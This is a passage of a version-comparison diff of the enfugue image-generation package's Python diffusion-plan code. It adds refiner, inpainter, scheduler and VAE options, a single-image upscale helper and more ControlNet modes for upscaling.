+            upscale_diffusion_steps if upscale_diffusion_steps is not None else DEFAULT_UPSCALE_DIFFUSION_STEPS
         )
         self.upscale_diffusion_strength = (
-            upscale_diffusion_strength
-            if upscale_diffusion_strength is not None
-            else DEFAULT_UPSCALE_DIFFUSION_STRENGTH
+            upscale_diffusion_strength if upscale_diffusion_strength is not None else DEFAULT_UPSCALE_DIFFUSION_STRENGTH
         )
         self.upscale_diffusion_prompt = (
-            upscale_diffusion_prompt
-            if upscale_diffusion_prompt is not None
-            else DEFAULT_UPSCALE_PROMPT
+            upscale_diffusion_prompt if upscale_diffusion_prompt is not None else DEFAULT_UPSCALE_PROMPT
         )
         self.upscale_diffusion_negative_prompt = (
             upscale_diffusion_negative_prompt
             if upscale_diffusion_negative_prompt is not None
             else DEFAULT_UPSCALE_NEGATIVE_PROMPT
         )
         self.upscale_diffusion_controlnet = upscale_diffusion_controlnet
@@ -578,25 +691,21 @@
         and then each subsequent step will be performed on the number of outputs from the
         first step.
         """
         # We import here so this file can be imported by processes without initializing torch
         from diffusers.utils.pil_utils import PIL_INTERPOLATION
         from diffusers.pipelines.stable_diffusion import StableDiffusionPipelineOutput
 
-        images, nsfw = self.execute_nodes(
-            pipeline, progress_callback, image_callback, image_callback_steps
-        )
+        images, nsfw = self.execute_nodes(pipeline, progress_callback, image_callback, image_callback_steps)
         if self.upscale is not None and self.outscale > 1:
             if self.upscale_iterative:
                 scales = [2] * int(math.log(self.outscale, 2))
             else:
                 scales = [self.outscale]
             for j, scale in enumerate(scales):
-                # Unload the pipeline to force buffers to refresh, saves VRAM but takes time
-                pipeline.unload_pipeline()
 
                 def get_item_for_scale(item: Any) -> Any:
                     if not isinstance(item, list):
                         return item
                     elif len(item) < j + 1:
                         if len(item) == 0:
                             return None
@@ -605,116 +714,152 @@
                         return item[j]
 
                 for i, image in enumerate(images):
                     if nsfw is not None and nsfw[i]:
                         logger.debug(f"Image {i} had NSFW content, not upscaling.")
                         continue
 
-                    upscale = get_item_for_scale(self.upscale)
+                    upscale = get_item_for_scale(self.upscale).lower()
                     logger.debug(f"Upscaling sample {i} by {scale} using {upscale}")
 
                     if upscale == "esrgan":
+                        pipeline.offload_pipeline()
+                        pipeline.offload_refiner()
                         image = pipeline.upscaler.esrgan(image, tile=pipeline.size, outscale=scale)
                     elif upscale == "esrganime":
-                        image = pipeline.upscaler.esrgan(
-                            image, tile=pipeline.size, outscale=scale, anime=True
-                        )
+                        pipeline.offload_pipeline()
+                        pipeline.offload_refiner()
+                        image = pipeline.upscaler.esrgan(image, tile=pipeline.size, outscale=scale, anime=True)
                     elif upscale == "gfpgan":
+                        pipeline.offload_pipeline()
+                        pipeline.offload_refiner()
                         image = pipeline.upscaler.gfpgan(image, tile=pipeline.size, outscale=scale)
                     elif upscale in PIL_INTERPOLATION:
                         width, height = image.size
-                        image = image.resize(
-                            (width * scale, height * scale), resample=PIL_INTERPOLATION[upscale]
-                        )
+                        image = image.resize((width * scale, height * scale), resample=PIL_INTERPOLATION[upscale])
                     else:
                         logger.error(f"Unknown upscaler {upscale}")
                         return images
                     images[i] = image
 
-                # Unload the upscaler to save VRAM
-                pipeline.unload_upscaler()
-
                 if image_callback is not None and (j < len(scales) - 1 or self.upscale_diffusion):
                     image_callback(images)
 
                 if self.upscale_diffusion:
-                    # Disable pipeline safety here, it gives many false positives when upscaling.
-                    # We'll re-enable it after.
-                    re_enable_safety = pipeline.safe
-                    pipeline.safe = False
+                    if self.refiner:
+                        # Refiners have safety disabled from the jump
+                        logger.debug("Using refiner for upscaling.")
+                        re_enable_safety = False
+                        pipeline.reload_refiner()
+                    else:
+                        # Disable pipeline safety here, it gives many false positives when upscaling.
+                        # We'll re-enable it after.
+                        logger.debug("Using base pipeline for upscaling.")
+                        re_enable_safety = pipeline.safe
+                        pipeline.safe = False
                     for i, image in enumerate(images):
                         if nsfw is not None and nsfw[i]:
                             logger.debug(f"Image {i} had NSFW content, not upscaling.")
                             continue
-                        # Prepare the pipeline again
-                        self.prepare_pipeline(pipeline)
+
                         width, height = image.size
                         kwargs = {
                             "width": width,
                             "height": height,
                             "image": image,
                             "num_images_per_prompt": 1,
                             "prompt": get_item_for_scale(self.upscale_diffusion_prompt),
-                            "negative_prompt": get_item_for_scale(
-                                self.upscale_diffusion_negative_prompt
-                            ),
+                            "negative_prompt": get_item_for_scale(self.upscale_diffusion_negative_prompt),
                             "strength": get_item_for_scale(self.upscale_diffusion_strength),
                             "num_inference_steps": get_item_for_scale(self.upscale_diffusion_steps),
-                            "guidance_scale": get_item_for_scale(
-                                self.upscale_diffusion_guidance_scale
-                            ),
+                            "guidance_scale": get_item_for_scale(self.upscale_diffusion_guidance_scale),
                             "chunking_size": self.upscale_diffusion_chunking_size,
                             "chunking_blur": self.upscale_diffusion_chunking_blur,
                             "progress_callback": progress_callback,
                         }
-                        if self.upscale_diffusion_scale_chunking_size:
-                            # Max out at half of the frame size or we get discontinuities
-                            kwargs["chunking_size"] = min(
-                                self.upscale_diffusion_chunking_size * (j + 1), pipeline.size // 2
-                            )
-                        if self.upscale_diffusion_scale_chunking_blur:
-                            kwargs["chunking_blur"] = min(
-                                self.upscale_diffusion_chunking_blur * (j + 1), pipeline.size // 2
-                            )
+
                         upscale_controlnet = get_item_for_scale(self.upscale_diffusion_controlnet)
                         if upscale_controlnet is not None:
                             logger.debug(f"Enabling {upscale_controlnet} for upscale diffusion")
                             if upscale_controlnet == "canny":
                                 pipeline.controlnet = "canny"
                                 kwargs["control_image"] = pipeline.edge_detector.canny(image)
-                            elif upscale_controlnet == "mlsd":
-                                pipeline.controlnet = "mlsd"
-                                kwargs["control_image"] = pipeline.edge_detector.mlsd(image)
                             elif upscale_controlnet == "hed":
                                 pipeline.controlnet = "hed"
                                 kwargs["control_image"] = pipeline.edge_detector.hed(image)
+                            elif upscale_controlnet == "scribble":
+                                pipeline.controlnet = "scribble"
+                                kwargs["control_image"] = pipeline.edge_detector.hed(image, scribble=True)
+                            elif upscale_controlnet == "mlsd":
+                                pipeline.controlnet = "mlsd"
+                                kwargs["control_image"] = pipeline.line_detector.mlsd(image)
+                            elif upscale_controlnet == "line":
+                                pipeline.controlnet = "line"
+                                kwargs["control_image"] = pipeline.line_detector.line(image)
+                            elif upscale_controlnet == "anime":
+                                pipeline.controlnet = "anime"
+                                kwargs["control_image"] = pipeline.line_detector.line(image, anime=True)
                             elif upscale_controlnet == "tile":
                                 pipeline.controlnet = "tile"
                                 kwargs["control_image"] = image
+                            elif upscale_controlnet == "depth":
+                                pipeline.controlnet = "depth"
+                                kwargs["control_image"] = pipeline.depth_detector.midas(image)
+                            elif upscale_controlnet == "normal":
+                                pipeline.controlnet = "normal"
+                                kwargs["control_image"] = pipeline.depth_detector.normal(image)
                             else:
                                 logger.error(f"Unknown controlnet {upscale_controlnet}, ignoring.")
                                 pipeline.controlnet = None
                         else:
                             pipeline.controlnet = None
-                        image = pipeline(**kwargs).images[0]
+                        if self.refiner:
+                            upscale_pipeline = pipeline.refiner_pipeline
+                        else:
+                            pipeline.reload_pipeline()  # If we didn't change controlnet, then pipeline is still on CPU
+                            upscale_pipeline = pipeline.pipeline
+
+                        if self.upscale_diffusion_scale_chunking_size:
+                            # Max out at half of the frame size or we get discontinuities
+                            kwargs["chunking_size"] = min(
+                                self.upscale_diffusion_chunking_size * (j + 1), pipeline.size // 2
+                            )
+                        if self.upscale_diffusion_scale_chunking_blur:
+                            kwargs["chunking_blur"] = min(
+                                self.upscale_diffusion_chunking_blur * (j + 1), pipeline.size // 2
+                            )
+
+                        logger.debug(f"Upscaling sample {i} with arguments {kwargs}")
+                        image = upscale_pipeline(**kwargs).images[0]
                         images[i] = image
                     if re_enable_safety:
                         pipeline.safe = True
+                elif j >= len(scales) - 1:
+                    pipeline.reload_pipeline()
                 if j < len(scales) - 1 and image_callback is not None:
                     image_callback(images)
         return StableDiffusionPipelineOutput(images=images, nsfw_content_detected=nsfw)
 
     def prepare_pipeline(self, pipeline: DiffusionPipelineManager) -> None:
         """
         Assigns pipeline-level variables.
         """
+        pipeline.start_keepalive() # Make sure this is going
         pipeline.model = self.model
+        pipeline.refiner = self.refiner
+        pipeline.inpainter = self.inpainter
         pipeline.lora = self.lora
+        pipeline.lycoris = self.lycoris
         pipeline.inversion = self.inversion
         pipeline.size = self.size
+        pipeline.scheduler = self.scheduler
+        pipeline.multi_scheduler = self.multi_scheduler
+        pipeline.vae = self.vae
+        pipeline.refiner_size = self.refiner_size
+        pipeline.inpainter_size = self.inpainter_size
         if self.build_tensorrt:
             pipeline.build_tensorrt = True
 
     def execute_nodes(
         self,
         pipeline: DiffusionPipelineManager,
         progress_callback: Optional[Callable[[int, int, float], None]] = None,
@@ -759,17 +904,15 @@
                     for j, callback_image in enumerate(callback_images):
                         images[j].paste(node.resize_image(callback_image), node.bounds[0])
                     image_callback(images)  # type: ignore
 
             else:
                 node_image_callback = None  # type: ignore
             invocation_kwargs = {**self.kwargs, **callback_kwargs}
-            result = node.execute(
-                pipeline, latent_callback=node_image_callback, **invocation_kwargs
-            )
+            result = node.execute(pipeline, latent_callback=node_image_callback, **invocation_kwargs)
             for j, image in enumerate(result["images"]):
                 image = node.resize_image(image)
                 if image.mode == "RGBA":
                     # Draw the alpha mask of the return image onto the outpaint mask
                     alpha = image.split()[-1]
                     black = PIL.Image.new("RGB", alpha.size, (0, 0, 0))
                     outpaint_mask.paste(black, node.bounds[0], mask=alpha)
@@ -786,15 +929,15 @@
 
             # Call the callback
             if image_callback is not None:
                 image_callback(images)
 
         # Determine if there's anything left to outpaint
         image_r_min, image_r_max = outpaint_mask.getextrema()[1]
-        if image_r_max > 0:
+        if image_r_max > 0 and self.prompt:
             # Outpaint
             del invocation_kwargs["num_images_per_prompt"]
             outpaint_mask = feather_mask(outpaint_mask)
 
             outpaint_prompt_tokens = TokenMerger()
             outpaint_negative_prompt_tokens = TokenMerger()
 
@@ -852,19 +995,27 @@
                 "amount": self.outscale,
                 "iterative": self.upscale_iterative,
                 "diffusion": upscale_diffusion_dict,
             }
 
         return {
             "model": self.model,
+            "refiner": self.refiner,
+            "inpainter": self.inpainter,
             "lora": self.lora,
+            "lycoris": self.lycoris,
             "inversion": self.inversion,
+            "scheduler": self.scheduler,
+            "multi_scheduler": self.multi_scheduler,
+            "vae": self.vae,
             "width": self.width,
             "height": self.height,
             "size": self.size,
+            "inpainter_size": self.inpainter_size,
+            "refiner_size": self.refiner_size,
             "seed": self.seed,
             "prompt": self.prompt,
             "negative_prompt": self.negative_prompt,
             "image": self.image,
             "image_callback_steps": self.image_callback_steps,
             "nodes": [node.get_serialization_dict() for node in self.nodes],
             "samples": self.samples,
@@ -877,24 +1028,29 @@
     @staticmethod
     def deserialize_dict(plan_dict: Dict[str, Any]) -> DiffusionPlan:
         """
         Given a serialized dictionary, instantiate a diffusion plan.
         """
         kwargs = {
             "model": plan_dict["model"],
-            "nodes": [
-                DiffusionNode.deserialize_dict(node_dict)
-                for node_dict in plan_dict.get("nodes", [])
-            ],
+            "nodes": [DiffusionNode.deserialize_dict(node_dict) for node_dict in plan_dict.get("nodes", [])],
         }
 
         for arg in [
+            "refiner",
+            "inpainter",
             "size",
+            "refiner_size",
+            "inpainter_size",
             "lora",
+            "lycoris",
             "inversion",
+            "scheduler",
+            "multi_scheduler",
+            "vae",
             "width",
             "height",
             "image_callback_steps",
             "image",
             "chunking_size",
             "chunking_blur",
             "samples",
@@ -928,108 +1084,190 @@
                 ]:
                     if arg in upscale_diffusion:
                         kwargs[f"upscale_diffusion_{arg}"] = upscale_diffusion[arg]
         result = DiffusionPlan(**kwargs)
         return result
 
     @staticmethod
-    def create_mask(
-        width: int, height: int, left: int, top: int, right: int, bottom: int
-    ) -> PIL.Image.Image:
+    def create_mask(width: int, height: int, left: int, top: int, right: int, bottom: int) -> PIL.Image.Image:
         """
         Creates a mask from 6 dimensions
         """
         image = PIL.Image.new("RGB", (width, height))
         draw = PIL.ImageDraw.Draw(image)
         draw.rectangle([(left, top), (right, bottom)], fill="#ffffff")
         return image
 
     @staticmethod
+    def upscale_image(
+        image: PIL.Image,
+        size: Optional[int] = None,
+        refiner_size: Optional[int] = None,
+        inpainter_size: Optional[int] = None,
+        model: Optional[str] = None,
+        refiner: Optional[str] = None,
+        inpainter: Optional[str] = None,
+        lora: Optional[Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
+        lycoris: Optional[Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
+        inversion: Optional[Union[str, List[str]]] = None,
+        scheduler: Optional[SCHEDULER_LITERAL] = None,
+        multi_scheduler: Optional[MULTI_SCHEDULER_LITERAL] = None,
+        vae: Optional[VAE_LITERAL] = None,
+        seed: Optional[int] = None,
+        outscale: Optional[int] = 1,
+        upscale: Optional[Union[UPSCALE_LITERAL, List[UPSCALE_LITERAL]]] = None,
+        upscale_diffusion: bool = False,
+        upscale_iterative: bool = False,
+        upscale_diffusion_steps: Optional[Union[int, List[int]]] = DEFAULT_UPSCALE_DIFFUSION_STEPS,
+        upscale_diffusion_guidance_scale: Optional[
+            Union[float, int, List[Union[float, int]]]
+        ] = DEFAULT_UPSCALE_DIFFUSION_GUIDANCE_SCALE,
+        upscale_diffusion_strength: Optional[Union[float, List[float]]] = DEFAULT_UPSCALE_DIFFUSION_STRENGTH,
+        upscale_diffusion_prompt: Optional[Union[str, List[str]]] = DEFAULT_UPSCALE_PROMPT,
+        upscale_diffusion_negative_prompt: Optional[Union[str, List[str]]] = DEFAULT_UPSCALE_NEGATIVE_PROMPT,
+        upscale_diffusion_controlnet: Optional[Union[CONTROLNET_LITERAL, List[CONTROLNET_LITERAL]]] = None,
+        upscale_diffusion_chunking_size: Optional[int] = None,
+        upscale_diffusion_chunking_blur: Optional[int] = None,
+        upscale_diffusion_scale_chunking_size: bool = True,
+        upscale_diffusion_scale_chunking_blur: bool = True,
+        **kwargs: Any,
+    ) -> DiffusionPlan:
+        """
+        Generates a plan to upscale a single image
+        """
+        if not outscale or outscale < 1 or not upscale:
+            raise ValueError("Upscaling requires at least the outscale and upscale method.")
+        if kwargs:
+            logger.warning(f"Plan `upscale_image` keyword arguments ignored: {kwargs}")
+        width, height = image.size
+        nodes: List[NodeDict] = [
+            {
+                "image": image,
+                "w": width,
+                "h": height,
+                "x": 0,
+                "y": 0,
+                "fit": None,
+                "anchor": None,
+                "infer": False,
+                "inpaint": False,
+                "control": False,
+                "controlnet": None,
+                "prompt": None,
+                "negative_prompt": None,
+                "strength": None,
+                "conditioning_scale": None,
+                "mask": None,
+                "process_control_image": None,
+                "remove_background": None,
+                "invert": None,
+                "invert_mask": None,
+            }
+        ]
+        return DiffusionPlan.from_nodes(
+            size=size,
+            refiner_size=refiner_size,
+            inpainter_size=inpainter_size,
+            model=model,
+            refiner=refiner,
+            inpainter=inpainter,
+            lora=lora,
+            lycoris=lycoris,
+            inversion=inversion,
+            scheduler=scheduler,
+            multi_scheduler=multi_scheduler,
+            vae=vae,
+            seed=seed,
+            width=width,
+            height=height,
+            upscale=upscale,
+            outscale=outscale,
+            upscale_iterative=upscale_iterative,
+            upscale_diffusion=upscale_diffusion,
+            upscale_diffusion_steps=upscale_diffusion_steps,
+            upscale_diffusion_guidance_scale=upscale_diffusion_guidance_scale,
+            upscale_diffusion_strength=upscale_diffusion_strength,
+            upscale_diffusion_controlnet=upscale_diffusion_controlnet,
+            upscale_diffusion_chunking_size=upscale_diffusion_chunking_size,
+            upscale_diffusion_chunking_blur=upscale_diffusion_chunking_blur,
+            upscale_diffusion_scale_chunking_size=upscale_diffusion_scale_chunking_size,
+            upscale_diffusion_scale_chunking_blur=upscale_diffusion_scale_chunking_blur,
+            nodes=nodes,
+        )
+
+    @staticmethod
     def from_nodes(
-        size: Optional[int] = DEFAULT_SIZE,
+        size: Optional[int] = None,
+        refiner_size: Optional[int] = None,
+        inpainter_size: Optional[int] = None,
         model: Optional[str] = None,
-        lora: Optional[
-            Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]
-        ] = None,
+        refiner: Optional[str] = None,
+        inpainter: Optional[str] = None,
+        lora: Optional[Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
+        lycoris: Optional[Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
         inversion: Optional[Union[str, List[str]]] = None,
+        scheduler: Optional[SCHEDULER_LITERAL] = None,
+        multi_scheduler: Optional[MULTI_SCHEDULER_LITERAL] = None,
+        vae: Optional[VAE_LITERAL] = None,
         model_prompt: Optional[str] = None,
         model_negative_prompt: Optional[str] = None,
         samples: int = 1,
         seed: Optional[int] = None,
-        width: Optional[int] = DEFAULT_SIZE,
-        height: Optional[int] = DEFAULT_SIZE,
+        width: Optional[int] = None,
+        height: Optional[int] = None,
         image_callback_steps: int = DEFAULT_IMAGE_CALLBACK_STEPS,
         nodes: List[NodeDict] = [],
-        chunking_size: Optional[int] = DEFAULT_CHUNKING_SIZE,
-        chunking_blur: Optional[int] = DEFAULT_CHUNKING_BLUR,
+        chunking_size: Optional[int] = None,
+        chunking_blur: Optional[int] = None,
         prompt: Optional[str] = None,
         negative_prompt: Optional[str] = None,
         num_inference_steps: Optional[int] = DEFAULT_INFERENCE_STEPS,
         guidance_scale: Optional[float] = DEFAULT_GUIDANCE_SCALE,
+        refiner_strength: Optional[float] = DEFAULT_REFINER_STRENGTH,
+        refiner_guidance_scale: Optional[float] = DEFAULT_REFINER_GUIDANCE_SCALE,
+        refiner_aesthetic_score: Optional[float] = DEFAULT_AESTHETIC_SCORE,
+        refiner_negative_aesthetic_score: Optional[float] = DEFAULT_NEGATIVE_AESTHETIC_SCORE,
         outscale: Optional[int] = 1,
-        upscale: Optional[
-            Union[
-                Literal[
-                    "esrgan",
-                    "esrganime",
-                    "gfpgan",
-                    "lanczos",
-                    "bilinear",
-                    "bicubic",
-                    "lanczos",
-                    "nearest",
-                ],
-                List[
-                    Literal[
-                        "esrgan",
-                        "esrganime",
-                        "gfpgan",
-                        "lanczos",
-                        "bilinear",
-                        "bicubic",
-                        "lanczos",
-                        "nearest",
-                    ]
-                ],
-            ]
-        ] = None,
+        upscale: Optional[Union[UPSCALE_LITERAL, List[UPSCALE_LITERAL]]] = None,
         upscale_diffusion: bool = False,
         upscale_iterative: bool = False,
         upscale_diffusion_steps: Optional[Union[int, List[int]]] = DEFAULT_UPSCALE_DIFFUSION_STEPS,
         upscale_diffusion_guidance_scale: Optional[
             Union[float, int, List[Union[float, int]]]
         ] = DEFAULT_UPSCALE_DIFFUSION_GUIDANCE_SCALE,
-        upscale_diffusion_strength: Optional[
-            Union[float, List[float]]
-        ] = DEFAULT_UPSCALE_DIFFUSION_STRENGTH,
+        upscale_diffusion_strength: Optional[Union[float, List[float]]] = DEFAULT_UPSCALE_DIFFUSION_STRENGTH,
         upscale_diffusion_prompt: Optional[Union[str, List[str]]] = DEFAULT_UPSCALE_PROMPT,
-        upscale_diffusion_negative_prompt: Optional[
-            Union[str, List[str]]
-        ] = DEFAULT_UPSCALE_NEGATIVE_PROMPT,
-        upscale_diffusion_controlnet: Optional[
-            Union[
-                Literal["canny", "tile", "mlsd", "hed", "scribble", "inpaint"],
-                List[Literal["canny", "tile", "mlsd", "hed", "scribble", "inpaint"]],
-            ]
-        ] = None,
-        upscale_diffusion_chunking_size: Optional[int] = DEFAULT_UPSCALE_DIFFUSION_CHUNKING_SIZE,
-        upscale_diffusion_chunking_blur: Optional[int] = DEFAULT_UPSCALE_DIFFUSION_CHUNKING_BLUR,
+        upscale_diffusion_negative_prompt: Optional[Union[str, List[str]]] = DEFAULT_UPSCALE_NEGATIVE_PROMPT,
+        upscale_diffusion_controlnet: Optional[Union[CONTROLNET_LITERAL, List[CONTROLNET_LITERAL]]] = None,
+        upscale_diffusion_chunking_size: Optional[int] = None,
+        upscale_diffusion_chunking_blur: Optional[int] = None,
         upscale_diffusion_scale_chunking_size: bool = True,
         upscale_diffusion_scale_chunking_blur: bool = True,
+        **kwargs: Any,
     ) -> DiffusionPlan:
         """
         Assembles a diffusion plan from step dictionaries.
         """
+        if kwargs:
+            logger.warning(f"Plan `from_nodes` keyword arguments ignored: {kwargs}")
         # First instantiate the plan
         plan = DiffusionPlan(
             model=model,
+            refiner=refiner,
+            inpainter=inpainter,
             lora=lora,
+            lycoris=lycoris,
             inversion=inversion,
+            scheduler=scheduler,
+            multi_scheduler=multi_scheduler,
+            vae=vae,
             samples=samples,
             size=size,
+            refiner_size=refiner_size,
+            inpainter_size=inpainter_size,
             seed=seed,
             width=width,
             height=height,
             image_callback_steps=image_callback_steps,
             upscale=upscale,
             outscale=outscale,
             prompt=prompt,
@@ -1110,63 +1348,89 @@
             step = DiffusionStep(
                 width=width,
                 height=height,
                 prompt=str(prompt_tokens),
                 negative_prompt=str(negative_prompt_tokens),
                 num_inference_steps=num_inference_steps,
                 guidance_scale=guidance_scale,
+                refiner_strength=refiner_strength,
+                refiner_guidance_scale=refiner_guidance_scale,
+                refiner_aesthetic_score=refiner_aesthetic_score,
+                refiner_negative_aesthetic_score=refiner_negative_aesthetic_score,
             )
 
             plan.nodes = [DiffusionNode([(0, 0), (plan.width, plan.height)], step)]
 
-            plan.upscale_diffusion_prompt = [
-                str(merger) for merger in upscale_diffusion_prompt_tokens
-            ]
+            plan.upscale_diffusion_prompt = [str(merger) for merger in upscale_diffusion_prompt_tokens]
             plan.upscale_diffusion_negative_prompt = [
                 str(merger) for merger in upscale_diffusion_negative_prompt_tokens
             ]
             return plan
 
         # Using the diffusion canvas, assemble a multi-step plan
         for i, node_dict in enumerate(nodes):
             step = DiffusionStep(
-                num_inference_steps=num_inference_steps, guidance_scale=guidance_scale
+                num_inference_steps=num_inference_steps,
+                guidance_scale=guidance_scale,
+                refiner_strength=refiner_strength,
+                refiner_guidance_scale=refiner_guidance_scale,
+                refiner_aesthetic_score=refiner_aesthetic_score,
+                refiner_negative_aesthetic_score=refiner_negative_aesthetic_score,
             )
 
-            node_width = int(node_dict["w"])
-            node_height = int(node_dict["h"])
-            node_left = int(node_dict["x"])
-            node_top = int(node_dict["y"])
+            node_left = int(node_dict.get("x", 0))
+            node_top = int(node_dict.get("y", 0))
             node_fit = node_dict.get("fit", None)
             node_anchor = node_dict.get("anchor", None)
-            node_bounds = [
-                (node_left, node_top),
-                (node_left + node_width, node_top + node_height),
-            ]
 
             node_infer = node_dict.get("infer", False)
             node_inpaint = node_dict.get("inpaint", False)
             node_control = node_dict.get("control", False)
 
             node_controlnet = node_dict.get("controlnet", None)
             node_prompt = node_dict.get("prompt", None)
             node_negative_prompt = node_dict.get("negative_prompt", None)
             node_strength: Optional[float] = node_dict.get("strength", None)
             node_conditioning_scale: Optional[float] = node_dict.get("conditioning_scale", None)
             node_image = node_dict.get("image", None)
             node_inpaint_mask = node_dict.get("mask", None)
+            node_invert = node_dict.get("invert", False)
+            node_invert_mask = node_dict.get("invert_mask", False)
             node_process_control_image = node_dict.get("process_control_image", True)
             node_scale_to_model_size = node_dict.get("scale_to_model_size", True)
             node_remove_background = bool(node_dict.get("remove_background", False))
             node_inference_steps: Optional[int] = node_dict.get("inference_steps", None)  # type: ignore[assignment]
             node_guidance_scale: Optional[float] = node_dict.get("guidance_scale", None)  # type: ignore[assignment]
 
+            node_refiner_strength: Optional[float] = node_dict.get("refiner_strength", None)  # type: ignore[assignment]
+            node_refiner_guidance_scale: Optional[float] = node_dict.get("refiner_guidance_scale", None)  # type: ignore[assignment]
+            node_refiner_aesthetic_score: Optional[float] = node_dict.get("refiner_aesthetic_score", None)  # type: ignore[assignment]
+            node_refiner_negative_aesthetic_score: Optional[float] = node_dict.get("refiner_negative_aesthetic_score", None)  # type: ignore[assignment]
+
             node_prompt_tokens = TokenMerger()
             node_negative_prompt_tokens = TokenMerger()
 
+            if "w" in node_dict:
+                node_width = int(node_dict["w"])
+            elif node_image is not None:  # type: ignore[unreachable]
+                node_width, _ = node_image.size
+            else:
+                raise ValueError(f"Node {i} missing width, pass 'w' or an image")
+            if "h" in node_dict:
+                node_height = int(node_dict["h"])
+            elif node_image is not None:  # type: ignore[unreachable]
+                _, node_height = node_image.size
+            else:
+                raise ValueError(f"Node {i} missing height, pass 'h' or an image")
+
+            node_bounds = [
+                (node_left, node_top),
+                (node_left + node_width, node_top + node_height),
+            ]
+
             if node_prompt:
                 node_prompt_tokens.add(node_prompt)
                 for merger in upscale_diffusion_prompt_tokens:
                     merger.add(node_prompt, UPSCALE_PROMPT_STEP_WEIGHT / node_count)
             if prompt and node_image:
                 # Only add global prompt to image nodes, it overrides too much on region nodes
                 node_prompt_tokens.add(prompt, GLOBAL_PROMPT_STEP_WEIGHT)
@@ -1201,17 +1465,23 @@
                 black = PIL.Image.new("RGB", node_image.size, (0, 0, 0))
                 white = PIL.Image.new("RGB", node_image.size, (255, 255, 255))
                 node_mask.paste(black, mask=node_alpha)
                 node_mask_r_min, node_mask_r_max = node_mask.getextrema()[1]
 
                 node_image_needs_outpainting = node_mask_r_max > 0
 
-                if node_inpaint and node_inpaint_mask:
-                    # Inpaint prior to anything else. First invert mask
-                    node_inpaint_mask = PIL.ImageOps.invert(node_inpaint_mask.convert("L"))
+                if node_inpaint:
+                    if node_inpaint_mask:
+                        # Inpaint prior to anything else.
+                        node_inpaint_mask = node_inpaint_mask.convert("L")
+                        if node_invert_mask:
+                            node_inpaint_mask = PIL.ImageOps.invert(node_inpaint_mask)
+                    else:
+                        # Make blank mask
+                        node_inpaint_mask = PIL.Image.new("L", node_image.size, 0)
                     if node_image_needs_outpainting:
                         # Merge inpaint and outpaint masks
                         node_mask.paste(node_inpaint_mask)
                         node_inverse_alpha = PIL.Image.eval(node_alpha_clamp, lambda a: 255 - a)
                         node_mask.paste(white, mask=node_inverse_alpha)
                     else:
                         # Just use inpaint mask
@@ -1219,26 +1489,47 @@
 
                     inpaint_image_step = DiffusionStep(
                         image=node_image,
                         mask=feather_mask(node_mask.convert("1")),
                         prompt=str(node_prompt_tokens),
                         negative_prompt=str(node_negative_prompt_tokens),
                         guidance_scale=guidance_scale,
+                        num_inference_steps=node_inference_steps if node_inference_steps else num_inference_steps,
+                        refiner_strength=refiner_strength,
+                        refiner_guidance_scale=refiner_guidance_scale,
+                        refiner_aesthetic_score=refiner_aesthetic_score,
+                        refiner_negative_aesthetic_score=refiner_negative_aesthetic_score,
                     )
                     step_image = inpaint_image_step
                 elif node_image_needs_outpainting and (node_infer or node_control):
                     # There are gaps; add an outpaint step before the infer/control
-                    outpaint_image_step = DiffusionStep(
-                        image=node_image,
-                        mask=feather_mask(node_mask.convert("1")),
-                        prompt=str(node_prompt_tokens),
-                        negative_prompt=str(node_negative_prompt_tokens),
-                        guidance_scale=guidance_scale,
-                    )
-                    step_image = outpaint_image_step
+                    if node_infer or node_process_control_image:
+                        outpaint_image_step = DiffusionStep(
+                            image=node_image,
+                            mask=feather_mask(node_mask.convert("1")),
+                            prompt=str(node_prompt_tokens),
+                            negative_prompt=str(node_negative_prompt_tokens),
+                            guidance_scale=guidance_scale,
+                            num_inference_steps=node_inference_steps if node_inference_steps else num_inference_steps,
+                            refiner_strength=refiner_strength,
+                            refiner_guidance_scale=refiner_guidance_scale,
+                            refiner_aesthetic_score=refiner_aesthetic_score,
+                            refiner_negative_aesthetic_score=refiner_negative_aesthetic_score,
+                        )
+                        step_image = outpaint_image_step
+                    elif node_invert:
+                        # Paste on white
+                        white = PIL.Image.new("RGB", node_image.size, (255, 255, 255))
+                        white.paste(node_image, mask=node_alpha)
+                        step_image = white
+                    else:
+                        # Paste on black
+                        black = PIL.Image.new("RGB", node_image.size, (0, 0, 0))
+                        black.paste(node_image)
+                        step_image = black
                 else:
                     step_image = node_image
 
                 if not node_infer and not node_inpaint and not node_control:
                     # Just paste image
                     step.image = step_image
                 elif not node_infer and node_inpaint and not node_control:
@@ -1253,14 +1544,16 @@
                     if node_infer:
                         step.image = step_image
                     if node_control and node_controlnet:
                         step.controlnet = node_controlnet  # type: ignore
                         step.control_image = step_image
                         if not node_process_control_image:
                             step.process_control_image = False
+                            if node_invert and not isinstance(step_image, DiffusionStep):
+                                step.control_image = PIL.ImageOps.invert(step_image.convert("L"))  # type: ignore[unreachable]
                         if node_conditioning_scale:
                             step.conditioning_scale = node_conditioning_scale
             elif node_prompt:
                 step.prompt = str(node_prompt_tokens)
                 step.negative_prompt = str(node_negative_prompt_tokens)
                 step.width = node_width
                 step.height = node_height
@@ -1269,17 +1562,24 @@
                 raise ValueError("Can't assemble a node from arguments")
 
             # Set common args for node
             if node_inference_steps:
                 step.num_inference_steps = node_inference_steps
             if node_guidance_scale:
                 step.guidance_scale = node_guidance_scale
+            if node_refiner_strength:
+                step.refiner_strength = node_refiner_strength
+            if node_refiner_guidance_scale:
+                step.refiner_guidance_scale = node_refiner_guidance_scale
+            if node_refiner_aesthetic_score:
+                step.refiner_aesthetic_score = node_refiner_aesthetic_score
+            if node_refiner_negative_aesthetic_score:
+                step.refiner_negative_aesthetic_score = node_refiner_negative_aesthetic_score
             if not node_scale_to_model_size:
                 step.scale_to_model_size = False
-
             # Add step to plan
             plan.nodes.append(DiffusionNode(node_bounds, step))
 
         plan.upscale_diffusion_prompt = [str(prompt) for prompt in upscale_diffusion_prompt_tokens]
         plan.upscale_diffusion_negative_prompt = [
             str(negative_prompt) for negative_prompt in upscale_diffusion_negative_prompt_tokens
         ]
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/process.py` & `enfugue-0.2.0/enfugue/diffusion/process.py`

 * *Files 10% similar despite different names*

```diff
@@ -99,17 +99,15 @@
     ) -> List[PIL.Image.Image]:
         """
         Executes the plan, getting callbacks first.
         """
 
